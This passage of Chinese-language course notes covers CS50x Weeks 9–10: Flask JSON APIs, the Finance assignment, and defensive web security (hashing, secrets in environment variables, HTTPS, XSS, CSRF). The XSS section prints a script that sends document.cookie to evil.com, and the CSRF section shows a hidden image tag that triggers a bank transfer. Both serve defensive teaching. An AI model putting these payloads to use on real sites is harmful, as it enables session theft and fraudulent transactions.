+<p>Malan 的流程图总结：<strong>浏览器输入 /movies → Flask 路由函数执行 SQL → 拿到数据 → 塞进 Jinja 模板 → 渲染成 HTML → 返回给浏览器。</strong> 这个循环是 Web 应用的心跳。</p>
+
+<h3>9-7：JSON API——Flask 不只返回 HTML</h3>
+<p>Malan 在第 9 周末尾引入了一个「现代 Web 开发」的核心理念——你的 Flask 不一定是「返回整页 HTML 的传统网站」。它也可以是一个<strong>只返回 JSON 数据的 API</strong>——前端用 fetch 拿数据，自己渲染 DOM：</p>
+<pre>from flask import jsonify
+
+@app.route("/api/movies")
+def api_movies():
+    conn = sqlite3.connect("movies.db")
+    cursor = conn.execute("SELECT title, year FROM movies ORDER BY year DESC")
+    movies = [{"title": row[0], "year": row[1]} for row in cursor.fetchall()]
+    conn.close()
+    return jsonify(movies)    # 返回 JSON：[{"title": "...", "year": 2023}, ...]
+
+# 前端用 fetch 请求这个 API：
+# fetch('/api/movies')
+#     .then(res => res.json())
+#     .then(data => { /* 用 JS 动态渲染到 DOM */ })</pre>
+
+<h3>错误处理——自定义 404 / 500 页面</h3>
+<pre>@app.errorhandler(404)
+def not_found(error):
+    return render_template("404.html"), 404    # 注意返回状态码！
+
+@app.errorhandler(500)
+def server_error(error):
+    return render_template("500.html"), 500</pre>
+
+<h3>9-8：Week 9 的 Problem Set——CS50 Finance</h3>
+<p>这是 CS50 单体工作量最大的作业，也是 Final Project 之前的热身赛。你要搭一个<strong>完整的股票交易模拟网站</strong>：</p>
+<ul>
+<li>用户注册/登录/退出（Session + bcrypt 哈希密码）</li>
+<li>实时股票查询（调 IEX Cloud API 获取真实股价——在 Python 里用 requests 发 HTTP 请求）</li>
+<li>「买入」和「卖出」股票（SQL INSERT / UPDATE，记录历史交易）</li>
+<li>个人资产总览页（SQL JOIN + SUM + GROUP BY——Week 7 技能全用上）</li>
+<li>前端用 HTML/CSS 做界面，Jinja 模板渲染数据，JavaScript 做前端交互</li>
+</ul>
+<blockquote><p>做完 Finance 的学生的经典评价：「我在 CS50 的最后三周里写的代码，比我前 7 周加起来都多。但我不害怕了——因为我知道每一行代码在干什么。HTML 画界面，CSS 调样式，JS 加交互，Python 处理逻辑，SQL 存取数据。这些不是孤立的工具——它们是一台机器上互相咬合的齿轮。」</p></blockquote>
+
+<span class="dot"></span>
+
+<!-- ==================== WEEK 10 ==================== -->
+<h2>Week 10 · 网络安全、AI 与告别</h2>
+
+<h3>这节课的定位——最后的防御课</h3>
+<p>Malan 在最后一课的表情和第一课一样兴奋——但话题从「怎么写第一行代码」变成了「<strong>怎么防止别人毁掉你写的代码</strong>」。Week 10 不是新技术的教学——它是你前 9 周所有作品的安全审计。每一项安全技术都直接对应你在前 9 周写过的一个漏洞。</p>
+
+<h3>10-1：密码存储——永远不要存明文</h3>
+<p>回顾 Week 9 的 Finance 作业——你存了用户密码。Malan 问：「你存的时候，密码是什么形态？」如果你存的是原始密码（"12345"）——数据库一旦泄露，所有用户的密码直接暴露。而且大部分人在多个网站用同一个密码。</p>
+<p>正确做法——<strong>哈希（Hashing）</strong>。哈希是一个单向函数：输入 → 乱码输出。你无法从乱码反推出原始密码。</p>
+<pre># 错误——存明文
+db.execute("INSERT INTO users (username, password) VALUES (?, ?)",
+           username, password)  # password = "12345" ❌
+
+# 正确——存哈希
+from werkzeug.security import generate_password_hash, check_password_hash
+
+# 注册时——存哈希值
+hash = generate_password_hash(password)  # "12345" → "$2b$12$LJ3m4..."
+db.execute("INSERT INTO users (username, hash) VALUES (?, ?)", username, hash)
+
+# 登录时——比对哈希值，不需要知道原始密码
+user = db.execute("SELECT hash FROM users WHERE username = ?", username)
+if check_password_hash(user["hash"], password):
+    session["user"] = username  # 密码正确 ✅</pre>
+<table>
+<tr><th>哈希特性</th><th>解释</th></tr>
+<tr><td><strong>单向</strong></td><td>哈希 → 原文？不可能。就像你把鸡蛋炒了——不可能炒回生鸡蛋</td></tr>
+<tr><td><strong>确定性</strong></td><td>同一个输入永远产生同一个哈希——所以可以验证密码是否匹配</td></tr>
+<tr><td><strong>加盐（Salt）</strong></td><td>每个密码加上一个随机字符串再哈希。两个用户都设了 "12345" → 两个不同的哈希值。bcrypt 自动加盐</td></tr>
+<tr><td><strong>慢哈希</strong></td><td>bcrypt 故意很慢（约 0.3 秒/次）——对正常登录无感，但对暴力破解是灾难（每秒只能试 3 次而不是 30 亿次）</td></tr>
+</table>
+
+<h3>10-2：环境变量——不要把密码和密钥写进代码</h3>
+<p>Malan 在第 10 周特别强调了这条「不是安全技术，但和所有安全技术一样重要」的工程实践：</p>
+<pre># ❌ 错误——密钥硬编码在源代码里
+app.secret_key = "super-secret-key-123"
+API_KEY = "sk-abc123xyz"
+# 问题：一旦你把代码推到 GitHub——全世界都看到了你的密钥
+
+# ✅ 正确——密钥从环境变量读取
+import os
+app.secret_key = os.environ.get("FLASK_SECRET_KEY")
+API_KEY = os.environ.get("IEX_API_KEY")
+# 部署时在服务器上设置环境变量，或者用 .env 文件（加入 .gitignore！）</pre>
+<blockquote><p>Malan 的语气异常严肃：「我在 GitHub 上见过真实的 AWS 密钥被提交到公开仓库——几小时后，攻击者用它启动了 $50,000 的比特币矿机。密钥泄露不是'如果'的问题——是你第一次把代码推到 GitHub 时就会发生的事。<strong>.env 文件和 .gitignore 不是可选的——它们是代码的一部分。</strong>」</p></blockquote>
+
+<h3>10-3：HTTPS——数据在路上被偷看了怎么办</h3>
+<p>HTTP 是明文传输——你在星巴克的 WiFi 登录网站，隔壁桌的人用 Wireshark 能看到你的用户名和密码。HTTPS 用 TLS 加密——浏览器和服务器之间的所有数据被加密，中间任何人截获的都是乱码。</p>
+<p>生产环境中通过反向代理（Nginx/Caddy）处理 HTTPS 证书——Flask 不需要改一行代码。但 Malan 强调：<strong>在部署你的第一个真实项目时，确保 URL 是 https:// 开头。</strong></p>
+
+<h3>10-4：XSS（跨站脚本攻击）——别人的代码在你的网页上跑</h3>
+<p>这是 Malan 在 CS50 里的最后一个安全演示。他写了一个简单的留言板——用户输入留言，其他用户能看到。攻击者在留言里输入：</p>
+<pre>&lt;script&gt;alert('你被黑了！')&lt;/script&gt;</pre>
+<p>如果后端不做任何处理——<strong>每个打开这个页面的用户的浏览器都会执行这段 JS。</strong> 更恶劣的攻击：<code>&lt;script&gt;fetch('https://evil.com/steal?cookie='+document.cookie)&lt;/script&gt;</code>——把你的 Cookie（含 session_id）发到攻击者的服务器。</p>
+<p>防御：</p>
+<ul>
+<li><strong>Flask 的 Jinja 模板默认转义——{{ }} 输出的内容自动把 &lt; 变成 &amp;lt;</strong>（安全的 HTML 实体）。所以正常用模板就是安全的</li>
+<li>危险操作：<code>{{ user_input | safe }}</code>——标记为 safe 后不转义，相当于把用户输入当 HTML 执行。除非你绝对信任数据的来源，永远不要用 safe</li>
+<li>前端的对应：永远用 <code>textContent</code> 而不是 <code>innerHTML</code> 插入用户输入的内容</li>
+</ul>
+
+<h3>10-5：CSRF（跨站请求伪造）——别人的网站用你的身份发请求</h3>
+<p>场景：你登录了银行网站，Session Cookie 在你浏览器里。然后你打开了攻击者发来的一封邮件，邮件里有一张「不可见的图片」：</p>
+<pre>&lt;img src="https://bank.com/transfer?to=attacker&amount=10000"&gt;</pre>
+<p>你的浏览器看到了这行 HTML，自动向 bank.com 发了一个 GET 请求——<strong>并自动带上了你的 Session Cookie。</strong> 银行服务器看到有效的 Session → 认为是你本人在操作 → 转走了你的钱。</p>
+<p>防御：</p>
+<ul>
+<li><strong>关键操作只用 POST（不用 GET 接受修改数据的请求）</strong></li>
+<li><strong>CSRF Token</strong>——服务器给每个表单生成一个随机 token，藏在隐藏字段里。POST 时验证 token。攻击者不知道 token 是什么，无法构造有效的请求</li>
+<li>Flask-WTF 扩展自动处理 CSRF Token</li>
+</ul>
+
+<h3>10-6：AI 与编程的未来</h3>
+<p>Malan 在最后 20 分钟转向了一个更大的话题——CS50 2025 版新增了 AI 相关内容。「你们可能已经用 ChatGPT 或 Copilot 写了部分作业。我收到的学生邮件里有三分之一是 AI 帮忙起草的。——这 OK。但我要你们记住一件事：」</p>
+<blockquote><p>「AI 能写出你要的代码。但 AI <strong>不知道你为什么要这段代码。</strong> CS50 教你的不是'如何让 AI 替你写代码'——那是终端里一行 prompt 的事。CS50 教你的是：<strong>当 AI 写出了 bug 时，你能看懂 bug 在哪。当 AI 建议了一个 O(n²) 的算法时，你能说'等一下，用归并排序'。当老板问你'这个功能为什么花了三周'——你能解释清楚每一层技术决策。</strong>」</p></blockquote>
+<p>Malan 的 CS50 2025 结语：</p>
+<blockquote><p>「十年前，我站在这间教室告诉学生——CS50 不是教你 C 语言，不是教你 Python，不是教你 SQL。<strong>CS50 是教你如何解决问题。</strong> 十年后，工具变了。现在的工具能写代码。明年的工具也许能写整个应用。但那条核心原则没有变——<strong>计算机科学是关于解决问题的，而不是关于记忆语法的。</strong> 而解决问题——是人类独有的能力。至少目前为止。」</p></blockquote>
+
+<h3>10-7：Final Project——你手上最后一张白纸</h3>
+<p>CS50 的期末项目只有一个要求：<strong>做一个你想做的东西。</strong> 任何东西。一个网站、一个手机 App、一个游戏、一个数据分析工具。唯一的技术约束——它必须是你在 CS50 学到的东西的基础上做的。除此之外，没有要求。</p>
+<p>Malan 在最后一页 PPT 上展示了往届学生的作品——从校园二手书交易平台到自动生成俳句的 AI，从模拟气候变化的数据可视化到帮奶奶管理菜谱的 App。他说：「这些作品的共同点不是'用了什么技术'——是<strong>作者真的在乎这个东西。</strong> 做一个你会在周末打开、打磨、炫耀给朋友看的东西。Final Project 是你从 CS50 带走的名片。让它配得上你。」</p>
+
+<span class="dot"></span>
+
+<h2>📝 CS50 完整课程路线图——10 周的认知上升螺旋</h2>
+<table>
+<tr><th>周</th><th>主题</th><th>底层能力</th><th>标志性作业</th></tr>
+<tr><td><strong>Week 0</strong></td><td>Scratch</td><td>计算思维——拆解问题、顺序/选择/循环</td><td>原创 Scratch 作品</td></tr>
+<tr><td><strong>Week 1</strong></td><td>C 语法入门</td><td>从图形积木到文本代码的跃迁</td><td>马里奥金字塔</td></tr>
+<tr><td><strong>Week 2</strong></td><td>数组 + 字符串</td><td>批量数据处理、编译全流程</td><td>凯撒加密</td></tr>
+<tr><td><strong>Week 3</strong></td><td>算法 + 大 O</td><td>搜索、排序、复杂度——「怎么想」的框架</td><td>各种排序算法对比</td></tr>
+<tr><td><strong>Week 4</strong></td><td>指针 + 内存</td><td>理解计算机底层的物理模型</td><td>JPEG 照片恢复（数字取证）</td></tr>
+<tr><td><strong>Week 5</strong></td><td>数据结构</td><td>用指针和 malloc 搭积木</td><td>拼写检查器（三版本竞速）</td></tr>
+<tr><td><strong>Week 6</strong></td><td>Python</td><td>卸掉 C 的包袱——同一套思维换语言</td><td>图像滤镜（5 种）</td></tr>
+<tr><td><strong>Week 7</strong></td><td>SQL</td><td>从「怎么取」到「要什么」的范式转换</td><td>IMDb 百万行电影查询</td></tr>
+<tr><td><strong>Week 8</strong></td><td>HTML/CSS/JS</td><td>前端三件套——互联网的「用户界面层」</td><td>个人主页</td></tr>
+<tr><td><strong>Week 9</strong></td><td>Flask</td><td>全栈 Web——所有前期技能焊成一台机器</td><td>股票交易模拟（CS50 Finance）</td></tr>
+<tr><td><strong>Week 10</strong></td><td>安全 + AI + 告别</td><td>你写的代码如何被攻击、如何防御——以及 AI 时代你的不可替代性</td><td>Final Project</td></tr>
+</table>
+
+<h2>🎓 CS50 全课程学完后的能力清单</h2>
+<ul>
+<li>能用 <strong>C 语言</strong> 操作指针和动态内存，理解计算机底层的物理模型</li>
+<li>能分析算法的 <strong>大 O 复杂度</strong>，并在数组/链表/哈希表/树/Trie 之间做有依据的取舍</li>
+<li>能用 <strong>Python</strong> 快速实现数据处理、图像处理、Web 后端——并理解每一行的底层 C 原理</li>
+<li>能用 <strong>SQL</strong> 查询百万行数据，写 JOIN、子查询、聚合——并防御 SQL 注入</li>
+<li>能用 <strong>HTML/CSS/JavaScript</strong> 构建前端——理解 DOM、事件、AJAX/fetch、CSS 盒模型与定位</li>
+<li>能用 <strong>Flask</strong> 搭建全栈 Web 应用——路由、Jinja 模板、Session、Flask+SQL、JSON API</li>
+<li>能识别并防御最常见的 <strong>Web 安全攻击</strong>：SQL 注入、XSS、CSRF、明文密码、密钥泄露</li>
+<li>最重要的：<strong>能拆解任何一个你不熟悉的编程问题</strong>——因为你不是「学会了某门语言」，你是学会了「如何学习任何语言」</li>
+</ul>
+
+<hr>
+<p style="text-align:center;font-size:0.8rem;color:#aaa;">笔记整理：星尘 &nbsp;|&nbsp; 基于 CS50x 2025 课程 &nbsp;|&nbsp; 2026年5月29日</p>
+<div class="nav-bottom"><a href="#">↑ 回到顶部</a></div>
+</div></body></html>
